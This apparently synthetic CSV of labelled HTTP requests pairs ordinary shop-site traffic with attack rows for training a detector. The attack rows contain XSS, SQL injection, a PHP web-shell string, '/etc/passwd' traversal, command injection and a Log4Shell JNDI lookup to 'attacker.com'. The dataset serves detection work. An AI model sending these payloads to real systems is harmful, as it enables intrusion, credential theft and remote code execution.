id,timestamp,method,path,http_headers,body,label
66f28f0b-53c0-47d0-99e4-089c2775bd79,2026-02-25 05:45:26,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
dc2a366f-a043-4b46-93bd-1b6957589310,2026-02-25 02:11:30,POST,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
b8c3920c-fb2e-403f-a8e3-878e01cbfc5d,2026-02-24 13:43:51,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
34d96b80-82b4-4936-9079-b003bceb1c26,2026-02-25 04:39:02,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
3e2fb8fa-7e77-4931-8878-de31f162f451,2026-02-24 21:59:00,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
5b1c3204-6250-4e83-9bbb-a1a9a7f9ce1d,2026-02-24 10:03:00,GET,/checkout,User-Agent: Safari/537.36,,normal
f0cc2b98-9890-4100-a19c-9684a97a4260,2026-02-25 09:21:36,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: curl/7.68.0,|| ping -c 4 127.0.0.1 ||,attack
d94997a9-64bd-4502-a7b7-1e4f1e2e1a8c,2026-02-24 15:33:39,POST,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
3c3e36ba-fb7e-4880-a65d-cca9be1e0671,2026-02-24 16:04:24,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
63c62637-88ef-43d3-8c4a-d3fb70d5d260,2026-02-25 04:56:58,POST,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
75b5077f-c304-4632-8ac1-da94d2551ea8,2026-02-25 03:12:20,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
ed2c003b-e4b5-4efc-9ef7-58b97d9f393c,2026-02-24 16:13:32,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: curl/7.68.0,|| ping -c 4 127.0.0.1 ||,attack
85b57aad-4c23-4439-83c0-444c80f64432,2026-02-24 10:56:06,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
71cb8449-1607-4be3-9bcd-a2f93daccbd6,2026-02-24 14:37:15,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
1711546e-7196-4cb1-82b8-25b9cdc9dd6b,2026-02-24 12:14:13,GET,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
9393a825-7a77-46dd-ba85-ae2765482108,2026-02-25 04:08:54,POST,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
77f8390b-30f7-4c0e-9901-68925d61d757,2026-02-24 18:47:46,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
12a233ce-2080-4fc2-9dbb-1739ee1d1e10,2026-02-24 19:20:51,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
18dad9dc-c192-456a-860c-829fb66bbf8f,2026-02-24 22:13:35,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
fb984605-b974-432c-a125-d5a911f83bf3,2026-02-25 00:25:34,POST,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
1d4335cf-d7fa-470e-bacb-817e763d167d,2026-02-25 09:51:59,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
855bdb75-4263-447a-a988-fc69ae475eda,2026-02-24 12:24:27,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
66c13467-aad6-450e-ac40-00525ffca0b9,2026-02-24 11:23:02,GET,/products,User-Agent: Safari/537.36,,normal
20434729-5956-44fe-9f9f-1a2f720204e7,2026-02-25 09:07:55,POST,/checkout,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
5423f892-5c9d-4d0b-8d86-9154db6fe8c7,2026-02-25 06:22:54,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
73cefc85-a7b5-41bb-8349-9dd686c6df9c,2026-02-24 18:05:35,POST,/contact,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
4060251b-01fa-48d1-8a05-e70d0eeac02d,2026-02-25 00:32:17,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
d21f9648-717c-44e8-b952-b63ace5fa613,2026-02-25 00:09:03,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
cbf87503-2c9e-499e-9b85-bbaa2f22c8aa,2026-02-25 03:39:17,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
88c02998-f44d-469a-853d-bcc2b09c721d,2026-02-25 05:41:33,POST,/blog/article-1,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
d1d8d21f-68f3-49db-b41e-427ec9aa837c,2026-02-24 22:26:52,POST,/search?q=shoes,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
77803db5-908a-4125-9a31-0f2f4b7dff8a,2026-02-25 06:50:32,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
a33f09bc-c516-42ac-a8af-377ca717bc22,2026-02-24 13:19:23,GET,/cart,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
c92383ca-aca1-4fb4-a865-4343b8d39c70,2026-02-24 16:50:16,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
06c81d96-b761-41a8-879a-58a2a4eff54f,2026-02-25 04:50:27,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
e188ac06-42a7-4552-a1a3-7adcba8a2f18,2026-02-24 09:33:26,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
3a9b8463-d342-496c-846d-1e19f014b51c,2026-02-24 11:52:54,POST,/checkout,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
0e790c21-b3db-4dec-859e-cd399b1f6cc7,2026-02-25 04:50:45,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
fbf3fdbd-d1f2-48f9-9199-4b1c536b2eed,2026-02-24 12:01:50,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
b9866155-ee03-4fc6-8941-7cf4617cb54d,2026-02-24 17:20:22,POST,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
d4ea036e-e677-4829-b2a1-0ea5fae4b56f,2026-02-25 08:00:08,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
9d4de8fb-2f05-4b3a-8bd5-ca5e3e8e1e76,2026-02-24 22:38:35,POST,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
c9553529-b43c-4f2a-a0c9-03566192303b,2026-02-24 21:38:36,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
9e08a32e-2b9d-4896-b746-d71e893c41ac,2026-02-24 06:51:16,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
94fe5377-f668-4275-9877-eb83fc9d62db,2026-02-24 09:44:17,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
280f11c7-f602-47de-83c8-6ec161f1f754,2026-02-24 15:49:40,GET,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
59922351-c927-49dd-bcc6-addee007ec6f,2026-02-24 15:21:21,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
327ce93b-032c-47de-a713-c00c1bb3a2f2,2026-02-24 20:56:54,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: sqlmap/1.6,${jndi:ldap://attacker.com/a},attack
18e8e7f0-91e7-464c-84d0-44f191381028,2026-02-24 21:37:27,GET,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
22786002-d2be-46c9-80f4-66782738bfa6,2026-02-24 22:13:44,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
116da6fa-dc2f-485b-9e2f-5910f69f10c9,2026-02-24 13:46:23,POST,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
fda71227-1def-4426-84a1-081adfcb964e,2026-02-25 07:58:48,POST,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
8ea2c607-af1e-4cc5-964e-30b1b0ddf27a,2026-02-24 16:42:16,GET,/checkout,User-Agent: Safari/537.36,,normal
9c9d94a5-fb7f-430d-9a26-fa829df90b1d,2026-02-24 22:09:35,GET,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
e0712cc0-7ab9-4f2b-b266-75675aad2b1b,2026-02-25 03:02:32,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
62aac2b8-206a-4c02-b3f5-b574a45dca91,2026-02-24 17:40:19,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
142f65aa-fd25-432e-be1e-b87e469828f3,2026-02-24 22:43:52,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
0e01ff75-9a0f-40bf-b6f5-c3b7a924c4fb,2026-02-24 20:30:31,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
af8ac2bc-c1fc-469d-9c02-ef1dd06ce49f,2026-02-25 03:12:07,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
5ca6e45a-5973-4866-a0b9-cba71a3c7261,2026-02-24 12:51:33,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
2d5d3549-4bd1-4a50-8684-df05a797ddd5,2026-02-25 08:55:30,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
1360f3f0-ba32-42c8-b0c6-822d11b1b15b,2026-02-25 06:57:58,POST,/blog/article-1,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
216a2fa7-ae4d-4f88-9fd3-2dd0f40dc422,2026-02-25 05:42:15,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
c234664d-115d-40bd-ab70-31f267547de5,2026-02-24 15:05:14,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
8ed4337d-503a-4afa-b9fa-c3637eefd75f,2026-02-25 07:34:30,POST,/search?q=shoes,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
4f708b2e-5851-49d5-af7e-784a2a48b010,2026-02-24 12:53:35,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
e1707e1f-5261-4b9c-a358-a0f8768a2790,2026-02-24 09:25:35,POST,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
cb084bf8-2517-42a5-9baf-5fbd83597b10,2026-02-24 12:30:36,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
af2824c1-ca5b-40f7-a86d-bc5bde069733,2026-02-24 15:46:36,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
8dcc6d22-a782-4700-9eda-25ccbe1e3d5d,2026-02-24 19:22:11,POST,/home,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
0bbdcd83-e004-4902-ba98-72bc3b0e3ec7,2026-02-24 21:37:53,POST,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
c1c0a671-88c5-405e-a94b-50a37509294b,2026-02-25 05:13:05,POST,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
93f19551-926b-43a6-be34-dc81b99f75fa,2026-02-24 18:14:17,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
39d5da82-4da1-4166-9f83-bf82ff3078f7,2026-02-24 12:08:39,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Nikto/2.1.6,|| ping -c 4 127.0.0.1 ||,attack
af9ba0d7-5eaf-4e30-869d-3a000d60dbab,2026-02-24 20:49:11,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
8f0a83d9-abb1-4df3-b396-647866c8cfe7,2026-02-24 16:44:17,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
2698187f-7fcc-46b6-9767-34f54996eff8,2026-02-24 06:59:15,GET,/search?q=shoes,User-Agent: Safari/537.36,,normal
39885ca2-5422-4644-b44c-8aaabe44d4e8,2026-02-24 19:26:09,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
c772f201-0509-4eb6-9808-ddb8501d326d,2026-02-24 23:05:01,PUT,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
ce2469ee-8f76-42a3-b0d7-e8772ce0f33c,2026-02-24 08:31:52,PUT,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
bb6f055e-da67-4b22-b813-dc7b75c46a00,2026-02-24 10:48:49,PUT,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
84be38fa-8e1d-4413-a20b-b353f4a8b59b,2026-02-25 04:25:10,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
7960203e-ccdb-48f5-be51-93e02f27501a,2026-02-25 10:14:58,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
bdd811b6-9ea2-486e-8ce2-e09f080ce74f,2026-02-24 06:45:37,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
c3c2948d-ff62-439e-825f-aeb29bb6e206,2026-02-24 21:31:31,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
e061de52-5245-47dd-a488-261d370fb95b,2026-02-25 07:44:51,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
57785b49-8902-4ca4-922b-4b434b64e0c6,2026-02-25 08:26:25,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
871d06ff-7fa7-4ff6-9077-a9602a0f85fc,2026-02-25 06:58:08,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
12ce505c-d8e8-454f-891d-3a1c3fd80f69,2026-02-25 01:09:50,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
116e4b45-d672-41bf-b773-c562a2eb6de4,2026-02-24 21:33:08,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
81ce920b-c111-403e-82a1-2f78190a2959,2026-02-24 23:43:44,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
ee575576-4c9a-45cb-ae0f-d999a17d9c20,2026-02-25 06:48:53,POST,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
da0a0281-5ca5-46d1-b17d-f98f121f1f5c,2026-02-24 20:33:44,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
e3ce550e-4584-41b8-86ac-28e05b009bed,2026-02-24 13:06:58,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
dfc4e18a-6471-4dc7-8195-8de6025698d4,2026-02-24 17:05:28,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
9066f5db-a939-4ac1-91a1-34119ee88dad,2026-02-25 01:16:09,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
52b8f2c0-03a4-4589-8a27-6f3f70ec62f9,2026-02-24 18:31:17,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
20a549b6-1cc4-4378-a1eb-c2986be646b2,2026-02-24 21:51:22,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
1052051b-728f-4bf2-a5cf-aca851c63042,2026-02-24 13:05:42,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
2ec17051-fe6e-495a-a7f3-9cb737bffb31,2026-02-24 13:56:25,PUT,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
ebacffc4-8023-475e-a4d8-762a127c61e2,2026-02-25 01:34:14,POST,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
55f68846-0b0a-48b6-8d76-bf8affe47726,2026-02-24 18:48:13,GET,/cart,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
bbf0b220-259c-426e-b788-fd0955b92956,2026-02-25 08:24:47,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
1342b2f4-2ec6-4ff9-a4f5-40c1e73019a0,2026-02-24 15:01:51,POST,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
63feda74-8231-45f4-bf7b-edadca9061cc,2026-02-24 19:23:35,GET,/cart,User-Agent: Safari/537.36,,normal
21fcae0f-d098-4eab-a606-de0b4fb60069,2026-02-24 23:47:38,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
0a569133-c52e-4e5a-9e4f-233f35fe8798,2026-02-25 05:35:40,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
71bcbfcf-99fb-4821-bc26-84ca7f1bcf24,2026-02-25 02:06:08,POST,/blog/article-1,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
7bc276fe-7a18-42c5-9196-1abe77c7270c,2026-02-25 02:24:12,POST,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
68f77683-c9fc-4eb8-a938-513b27665660,2026-02-24 07:46:04,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
70a5d060-a90a-4e3c-9c13-37ad6b773811,2026-02-25 03:13:24,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
5a951acd-1196-4e30-b0e5-69c992ec45cd,2026-02-24 10:39:26,GET,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
b88fb89c-4e1b-432d-8044-7643fd3adf15,2026-02-24 22:02:21,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
f6ffa3d0-b7b5-4ab8-8ae1-ee96b492e85f,2026-02-25 07:29:59,POST,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
a5f6aad3-080a-4034-92b4-7177af64256b,2026-02-24 11:31:30,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
9c2d7e21-0a37-4b66-a674-12261a4c2c57,2026-02-24 12:50:44,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
dbc8a335-6b3f-47ac-813f-48c5243e5add,2026-02-24 08:57:16,GET,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
4159f86f-365e-40cc-a9f5-ad30a75e2f4f,2026-02-24 18:16:53,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
350a1445-889a-48c1-8fdc-a3d044a91126,2026-02-24 23:25:35,GET,/checkout,User-Agent: Chrome/120.0.0.0,,normal
e6b6d746-5477-4b73-a015-aba1ef38ba70,2026-02-24 12:38:21,POST,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
6209e23e-fd77-494b-90ce-573e13284c89,2026-02-25 00:30:51,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
22fdc59b-732c-452a-87f3-22c4511fca63,2026-02-24 20:22:18,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
e8297e1d-06b4-466a-a50b-9e45f20da37d,2026-02-25 00:58:18,GET,/products,User-Agent: Safari/537.36,,normal
de7b08fd-1369-44bc-88ce-ebc9864ac16c,2026-02-24 13:34:00,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
64ec09c4-65f1-44b1-a4dc-54f718c934bc,2026-02-25 01:38:42,POST,/api/v1/users,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
31f4bd98-f53b-47a5-905a-415914ef764d,2026-02-24 20:00:53,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
4817a607-c4a2-473f-9cab-6b960e4d4b9a,2026-02-24 12:23:36,POST,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
476e4b39-182d-42f4-a087-c97930aad077,2026-02-24 10:47:01,GET,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
e0c54992-21aa-4533-b008-2e14ee858435,2026-02-24 18:27:06,POST,/blog/article-1,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
cc21efe3-c05f-4f4f-9bb5-c378465973f7,2026-02-25 04:18:03,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
a5b7785d-f4fe-45a6-80e0-67301b0420cc,2026-02-24 11:30:08,GET,/cart,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
84c066fe-cd7d-4a13-8222-43457ab558e0,2026-02-24 17:10:24,POST,/products?id=123,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
c332d4f9-b915-4ad6-a55e-5ffec6433675,2026-02-25 05:23:03,GET,/blog/article-1,User-Agent: Chrome/120.0.0.0,,normal
6da0539d-feaa-4587-9624-2fbc4861720e,2026-02-25 02:09:06,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
c9531bc3-2f66-48d5-af3c-4cb6f6d91e94,2026-02-24 11:37:59,POST,/blog/article-1,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
d538a3f6-9c40-4912-8f3e-b0f7f531bc9c,2026-02-25 00:51:29,PUT,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
0753e4c0-1314-4a1a-9776-6c6b8c0abd62,2026-02-24 07:28:41,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Nikto/2.1.6,<script>alert('XSS')</script>,attack
